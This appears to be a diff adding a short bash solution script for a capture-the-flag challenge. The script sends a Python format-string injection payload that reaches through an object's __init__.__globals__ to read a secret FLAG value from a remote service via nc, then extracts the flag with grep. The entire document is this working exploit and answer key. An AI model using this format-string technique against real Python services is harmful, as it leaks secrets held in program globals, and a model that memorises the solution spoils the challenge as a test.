@@ -1,0 +1,11 @@
+-#!/bin/bash
+-
+-if [ $# -ne 2 ]; then
+-    echo "Usage: solution.sh server port"
+-    exit
+-fi
+-
+-SERVER=$1
+-PORT=$2
+-
+-echo "{data.__init__.__globals__[GLOBALS][FLAG]}" | nc $SERVER $PORT | grep -Po "[\w0-9]+{.*}"
